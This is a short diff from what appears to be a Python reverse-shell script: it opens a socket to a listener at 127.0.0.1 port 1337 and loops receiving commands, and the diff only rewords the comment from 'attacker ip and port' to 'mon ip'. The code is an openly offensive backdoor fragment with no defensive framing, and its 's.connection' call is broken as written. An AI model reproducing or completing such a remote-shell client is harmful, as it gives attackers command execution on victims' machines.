@@ -4,7 +4,7 @@ import subprocess
 
 def connection():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connection(('127.0.0.1', 1337)) #attacker ip and port
+    s.connection(('127.0.0.1', 1337)) #mon ip
 
     while True:
         command = s.recv(1024)
